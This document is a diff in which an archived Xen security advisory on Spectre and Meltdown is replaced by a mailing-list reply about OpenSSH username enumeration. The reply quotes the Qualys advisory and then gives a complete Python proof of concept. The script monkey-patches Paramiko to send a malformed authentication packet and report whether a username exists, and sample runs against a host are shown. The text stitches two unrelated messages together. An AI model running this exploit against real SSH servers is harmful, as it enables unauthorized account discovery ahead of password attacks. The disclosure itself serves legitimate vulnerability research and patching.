@@ -1,209 +1,126 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/01/16/5
-Message-Id: <E1ebVGo-0005UP-WF@xenbits.xenproject.org>
-Date: Tue, 16 Jan 2018 17:43:34 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security-team-members@....org>
-Subject: Xen Security Advisory 254 (CVE-2017-5753,CVE-2017-5715,CVE-2017-5754) - Information leak via side effects of speculative execution
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/16/1
+Message-ID: <CAD3CanckcSk0T5sGa4LxsShYhkTDc8u6Fgdz=jvJ90buwDiH1g@mail.gmail.com>
+Date: Thu, 16 Aug 2018 23:43:07 +1200
+From: Matthew Daley <mattd@...fuzz.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: OpenSSH Username Enumeration
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+On 16 August 2018 at 04:05, Qualys Security Advisory <qsa@...lys.com> wrote:
+> The attacker can try to authenticate a user with a malformed packet (for
+> example, a truncated packet), and:
+>
+> - if the user is invalid (it does not exist), then userauth_pubkey()
+>   returns immediately, and the server sends an SSH2_MSG_USERAUTH_FAILURE
+>   to the attacker;
+>
+> - if the user is valid (it exists), then sshpkt_get_u8() fails, and the
+>   server calls fatal() and closes its connection to the attacker.
 
- Xen Security Advisory CVE-2017-5753,CVE-2017-5715,CVE-2017-5754 / XSA-254
-                                 version 8
+I've written a POC for this issue, located at
+https://bugfuzz.com/stuff/ssh-check-username.py . It requires the
+Paramiko library (http://www.paramiko.org/) to be available. It does
+some gross monkey patching of Paramiko to force it into sending an
+invalid `SSH2_MSG_USERAUTH_REQUEST` and intercepting the potentially
+resultant `SSH2_MSG_USERAUTH_FAILURE` but seems to work well enough. A
+sample usage is as follows:
 
-        Information leak via side effects of speculative execution
+$ nc test.internal 22
+SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u3
+^C
+$ ./ssh-check-username.py test.internal root
+[+] Valid username
+$ ./ssh-check-username.py test.internal www-data
+[+] Valid username
+$ ./ssh-check-username.py test.internal thisisinvalid
+[*] Invalid username
 
-UPDATES IN VERSION 8
-====================
+The POC is also included below for archival purposes.
 
-PVH shim ("Comet") is now available for Xen 4.8.
+--- 8< ---
 
-Fixes for two bugs in PVH shim "Comet": one relating to shim
-initialisation, which can cause hangs during guest boot shortly after
-host boot(!), and one to make qemu PV backends work in PVH mode.
-Thanks to the respective contributors.
+#!/usr/bin/env python
 
-We are longer inclined to port the "Comet" patches to Xen 4.9.  If
-this causes you a problem please let us know by contacting us:
- To: security@...project.org; CC: xen-devel@...ts.xenproject.org
-
-ISSUE DESCRIPTION
-=================
-
-Processors give the illusion of a sequence of instructions executed
-one-by-one.  However, in order to most efficiently use cpu resources,
-modern superscalar processors actually begin executing many
-instructions in parallel.  In cases where instructions depend on the
-result of previous instructions or checks which have not yet
-completed, execution happens based on guesses about what the outcome
-will be.  If the guess is correct, execution has been sped up.  If the
-guess is incorrect, partially-executed instructions are cancelled and
-architectural state changes (to registers, memory, and so on)
-reverted; but the whole process is no slower than if no guess had been
-made at all.  This is sometimes called "speculative execution".
-
-Unfortunately, although architectural state is rolled back, there are
-other side effects, such as changes to TLB or cache state, which are
-not rolled back.  These side effects can subsequently be detected by
-an attacker to determine information about what happened during the
-speculative execution phase.  If an attacker can cause speculative
-execution to access sensitive memory areas, they may be able to infer
-what that sensitive memory contained.
-
-Furthermore, these guesses can often be 'poisoned', such that attacker
-can cause logic to reliably 'guess' the way the attacker chooses.
-This advisory discusses three ways to cause speculative execution to
-access sensitive memory areas (named here according to the
-discoverer's naming scheme):
-
-"Bounds-check bypass" (aka SP1, "Variant 1", Spectre CVE-2017-5753):
-Poison the branch predictor, such that victim code is speculatively
-executed past boundary and security checks.  This would allow an
-attacker to, for instance, cause speculative code in the normal
-hypercall / emulation path to execute with wild array indexes.
-
-"Branch Target Injection" (aka SP2, "Variant 2", Spectre CVE-2017-5715):
-Poison the branch predictor.  Well-abstracted code often involves
-calling function pointers via indirect branches; reading these
-function pointers may involve a (slow) memory access, so the CPU
-attempts to guess where indirect branches will lead.  Poisoning this
-enables an attacker to speculatively branch to any code that is
-executable by the victim (eg, anywhere in the hypervisor).
-
-"Rogue Data Load" (aka SP3, "Variant 3", Meltdown, CVE-2017-5754):
-On some processors, certain pagetable permission checks only happen
-when the instruction is retired; effectively meaning that speculative
-execution is not subject to pagetable permission checks.  On such
-processors, an attacker can speculatively execute arbitrary code in
-userspace with, effectively, the highest privilege level.
-
-More information is available here:
-  https://meltdownattack.com/
-  https://spectreattack.com/
-  https://googleprojectzero.blogspot.co.uk/2018/01/reading-privileged-memory-with-side.html
-
-Additional Xen-specific background:
-
-Xen hypervisors on most systems map all of physical RAM, so code
-speculatively executed in a hypervisor context can read all of system
-RAM.
-
-When running PV guests, the guest and the hypervisor share the address
-space; guest kernels run in a lower privilege level, and Xen runs in
-the highest privilege level.  (x86 HVM and PVH guests, and ARM guests,
-run in a separate address space to the hypervisor.)  However, only
-64-bit PV guests can generate addresses large enough to point to
-hypervisor memory.
-
-IMPACT
-======
-
-Xen guests may be able to infer the contents of arbitrary host memory,
-including memory assigned to other guests.
-
-An attacker's choice of code to speculatively execute (and thus the
-ease of extracting useful information) goes up with the numbers.  For
-SP1, an attacker is limited to windows of code after bound checks of
-user-supplied indexes.  For SP2, the attacker will in many cases will
-be limited to executing arbitrary pre-existing code inside of Xen.
-For SP3 (and other cases for SP2), an attacker can write arbitrary
-code to speculatively execute.
-
-Additionally, in general, attacks within a guest (from guest user to
-guest kernel) will be the same as on real hardware.  Consult your
-operating system provider for more information.
-
-NOTE ON TIMING
-==============
-
-This vulnerability was originally scheduled to be made public on 9
-January.  It was accelerated at the request of the discloser due to
-one of the issues being made public.
-
-VULNERABLE SYSTEMS
-==================
-
-Systems running all versions of Xen are affected.
-
-For SP1 and SP2, both Intel and AMD are vulnerable.  Vulnerability of
-ARM processors to SP1 and SP2 varies by model and manufacturer.  ARM
-has information on affected models on the following website:
-   https://developer.arm.com/support/security-update
-
-For SP3, only Intel processors are vulnerable.  (The hypervisor cannot
-be attacked using SP3 on any ARM processors, even those that are
-listed as affected by SP3.)
-
-Furthermore, only 64-bit PV guests can exploit SP3 against Xen.  PVH,
-HVM, and 32-bit PV guests cannot exploit SP3.
-
-MITIGATION
-==========
-
-There is no mitigation for SP1 and SP2.
-
-SP3 can be mitigated by running guests in HVM or PVH mode.
-(Within-guest attacks are still possible unless the guest OS has also
-been updated with an SP3 mitigation series such as KPTI/Kaiser.)
-
-For guests with legacy PV kernels which cannot be run in HVM or PVH
-mode directly, we have developed two "shim" hypervisors that allow PV
-guests to run in HVM mode or PVH mode.  This prevents attacks on the
-host, but it leaves the guest vulnerable to Meltdown attacks by its
-own unprivileged processes, even if the guest OS has KPTI or similar
-Meltdown mitigation.
-
-The HVM shim (codenamed "Vixen") is available now, as is the PVH shim
-(codenamed "Comet") for Xen 4.10 and Xen 4.8.   Please read
-README.which-shim to determine which shim is suitable for you.
-
-$ sha256sum xsa254*/*
-2f830fede5d58d3d90fe942ec2d8c4ef65cd14c4d565f9a1b9817847662ebba1  xsa254/README.comet
-1c594822dbd95998951203f6094bc77586d5720788de15897784d20bacb2ef08  xsa254/README.vixen
-7e816160c1c1d1cd93ec3c3dd9753c8f3957fefe86b7aa967e9e77833828f849  xsa254/README.which-shim
-1d2098ad3890a5be49444560406f8f271c716e9f80e7dfe11ff5c818277f33f8  xsa254/pvshim-converter.pl
-$
-
-RESOLUTION
-==========
-
-There is no available resolution for SP1.  A solution may be available
-in the future.
-
-We are working on patches which mitigate SP2 but these are not
-currently available.  Given that the vulnerabilities are now public,
-these will be developed and published in public, initially via
-xen-devel.
+# Copyright (c) 2018 Matthew Daley
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to
+# deal in the Software without restriction, including without limitation the
+# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
+# sell copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in
+# all copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
+# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
+# IN THE SOFTWARE.
 
 
-NOTE ON LACK OF EMBARGO
-=======================
+import argparse
+import logging
+import paramiko
+import socket
+import sys
 
-The timetable and process were set by the discloser.
 
-After the intensive initial response period for these vulnerabilities
-is over, we will prepare and publish a full timeline, as we have done
-in a handful of other cases of significant public interest where we
-saw opportunities for process improvement.
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
+class InvalidUsername(Exception):
+    pass
 
-iQEcBAEBCAAGBQJaXjm9AAoJEIP+FMlX6CvZ5VwH/1KQOIRXgsfYILMkdYIR4mG4
-VGFcPT7l6egTndGOxPUUDcjxchP1guyyAucSMX+OzoK+SNJReqlSM/mjIN9Vvka4
-BQiTr2Xh0y6GcyB+ldd29YTYAv45FYaIiMzrWUfATdkswezraW/uv3AKFkIrmwt3
-LRNMGws0fyXLYfLAISdUJtlLN5pfuQ6jKNGXQTnAbmJ+PbGuOBJcOrJZjf+estGK
-ptIp3jLwjBPuKwO8IR8jSYEAP7vOTRwOES1+TNeMyU9vPqWIa6D0L1wyjt4uTrjz
-OPeAgD52v/Xh4nekFDaAZYaezqhLuzQqpIJKAtGbAUMxJkzFhevgCcBzOu/1/vM=
-=F+76
------END PGP SIGNATURE-----
 
-Download attachment "xsa254/README.comet" of type "application/octet-stream" (2854 bytes)
+def add_boolean(*args, **kwargs):
+    pass
 
-Download attachment "xsa254/README.vixen" of type "application/octet-stream" (2736 bytes)
 
-Download attachment "xsa254/README.which-shim" of type "application/octet-stream" (4010 bytes)
+old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[
+        paramiko.common.MSG_SERVICE_ACCEPT]
 
-Download attachment "xsa254/pvshim-converter.pl" of type "application/octet-stream" (6762 bytes)
+def service_accept(*args, **kwargs):
+    paramiko.message.Message.add_boolean = add_boolean
+    return old_service_accept(*args, **kwargs)
+
+
+def userauth_failure(*args, **kwargs):
+    raise InvalidUsername()
+
+
+paramiko.auth_handler.AuthHandler._handler_table.update({
+    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
+    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
+})
+
+logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
+
+arg_parser = argparse.ArgumentParser()
+arg_parser.add_argument('hostname', type=str)
+arg_parser.add_argument('--port', type=int, default=22)
+arg_parser.add_argument('username', type=str)
+args = arg_parser.parse_args()
+
+sock = socket.socket()
+try:
+    sock.connect((args.hostname, args.port))
+except socket.error:
+    print '[-] Failed to connect'
+    sys.exit(1)
+
+transport = paramiko.transport.Transport(sock)
+try:
+    transport.start_client()
+except paramiko.ssh_exception.SSHException:
+    print '[-] Failed to negotiate SSH transport'
+    sys.exit(2)
+
+try:
+    transport.auth_publickey(args.username, paramiko.RSAKey.generate(2048))
+except InvalidUsername:
+    print '[*] Invalid username'
+    sys.exit(3)
+except paramiko.ssh_exception.AuthenticationException:
+    print '[+] Valid username'
